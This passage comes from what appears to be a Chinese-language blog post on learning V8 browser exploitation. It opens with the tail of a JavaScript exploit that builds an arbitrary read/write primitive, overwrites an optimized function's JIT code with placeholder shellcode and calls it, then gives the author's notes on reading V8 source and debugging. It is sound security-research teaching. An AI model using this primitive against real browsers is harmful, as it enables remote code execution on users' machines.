                oobArray[i + 2] = addr.asDouble();
                let arr = new Float64Array(bufs[this.idx_in_bufs_arr], 0, 0x10);
                //%DebugPrint(arr);
                return Int64.fromDouble(arr[0]);
            `}`

            write(addr, vals) `{`
                let i = this.idx_in_oob_arr;
                oobArray[i + 1] = (new Int64(addr)).asDouble();
                oobArray[i + 2] = (new Int64(addr)).asDouble();
                let arr = new Uint8Array(bufs[this.idx_in_bufs_arr]);
                arr.set(vals);
            `}`
        `}`

        arw = new ArbitraryReadWrite(changed_idx, i);
        break;
    `}`
`}`

if (arw === null) `{`
    throw new Error("arbitrary read write object construcion failed");
`}`

/* 对于optimized function, +48 对应Code object，紧接在Code object之后的就是jit代码
 * Code object 的size是96, 注意最后末位的flag bit
 * （不过对于如何从Optimized Function里得到48这个偏移量，我暂时还没有找到 */
let code_addr = arw.read(Add(jit_func_obj_ptr, 48));
console.log('code addr ' + code_addr);
let jit_code_addr = Add(code_addr, 95);

console.log('jit code addr ' + jit_code_addr);

// 现在可以写shellcode了
let shellcode = [0x90, 0x1, 0x2, 0x3, 0x90];
arw.write(jit_code_addr, shellcode);

// while (1) `{``}`
func_to_overwrite();
```



## 一些我遇到的问题

### <a class="reference-link" name="%E5%85%B3%E4%BA%8E%E6%89%BE%E4%BB%A3%E7%A0%81"></a>关于找代码

`v8`的代码用`C++`写的，有一些地方是非常乱的。。特别是在一个超大的class里找想要的constant，以及一些引用，非常难找，还好我找到了[这个用来看源码的网站](https://v8.paulfryzel.com/docs/master/)，同时支持了一些索引，会稍微比直接自己找容易一些。不过即便是如此，还是有一些代码我没办法快速找到，比如没有找到没有optimized的和optimized的函数的具体结构。各个对象的具体结构，本身也是一个非常难找的，只能从constant里面和注释去猜，我估计还是需要更细致的去阅读一些代码才能够找到这一部分的信息。

### <a class="reference-link" name="%E5%85%B3%E4%BA%8E%E8%B0%83%E8%AF%95"></a>关于调试

调试也是其中一个非常麻烦的地方，主要是gdb是获取不到js里边的变量信息的，这样的话连拿到地址都是一个比较麻烦的问题，不过还好最后搜到`v8`提供了`--allow-natives-syntax`，可以开启一些原生函数，包括很重要的`%DebugPrint`，可以把变量的地址打印出来，可惜依然没有办法直接获取到某个对象的清晰内存结构（或许可以通过阅读这个函数的实现去得到内存结构的信息?）。

所以最后的调试方法，通过`%DebugPrint`打印出需要的各种信息，然后如果需要断在某个地方，就写个死循环，然后通过`gdb`插件一般都拥有的`ctrl c`断下来的功能，然后通过打印出来的地址去查看结构。不过这样的问题就在于看不到某个结构对应的是什么东西，所以还是要靠打印出来的信息去对应。这个地方目前我还是在摸索当中，希望有大佬可以指点。。

### <a class="reference-link" name="%E5%85%B3%E4%BA%8E%E5%90%84%E7%A7%8D%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"></a>关于各种基础知识

刚开始学习这一块内容的时候是觉得自己缺少很多相关知识的，肯定需要阅读很多资料，但是事实上我没有找到比较好的资料汇总，所以我自己建立了一个`github` repo，把我过程当中搜到的，其他地方见到的资料都汇总在了一起，地址在[这里](https://github.com/Escapingbug/awesome-browser-exploit)，欢迎各位把找到的资料通过提交`pull request`，一起来建立这个资料库。



## 总结

浏览器项目太庞大了，到现在为止，光是js引擎就足有不低的复杂度，还需要很多的学习。另外，即使是如此精妙的项目，也具有大量的漏洞，应该也是个不错的研究方向。
